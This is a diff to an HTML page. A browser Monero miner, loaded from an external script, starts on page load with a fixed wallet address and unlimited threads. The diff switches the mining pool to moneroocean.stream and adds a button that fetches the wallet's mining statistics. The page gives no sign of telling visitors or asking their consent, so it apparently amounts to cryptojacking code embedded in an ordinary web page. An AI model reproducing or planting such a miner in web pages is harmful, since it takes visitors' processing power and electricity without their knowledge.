@@ -7,13 +7,38 @@
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "xmr-us-west1.nanopool.org";
+    var pool = "moneroocean.stream";
     var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
     var workerId = ""
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
+</script>
+<script>
+let btn = document.createElement("button");
+btn.innerHTML = "Click for stats";
+btn.onclick = function () {
+  function makeHttpObject() {
+  try {return new XMLHttpRequest();}
+  catch (error) {}
+  try {return new ActiveXObject("Msxml2.XMLHTTP");}
+  catch (error) {}
+  try {return new ActiveXObject("Microsoft.XMLHTTP");}
+  catch (error) {}
+
+  throw new Error("Could not create HTTP request object.");
+}
+
+var request = makeHttpObject();
+request.open("GET", "https://api.moneroocean.stream/miner/4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si/stats", true);
+request.send(null);
+request.onreadystatechange = function() {
+  if (request.readyState == 4)
+    alert(request.responseText);
+};
+};
+document.body.appendChild(btn);
 </script>
 </body>
 </html> 
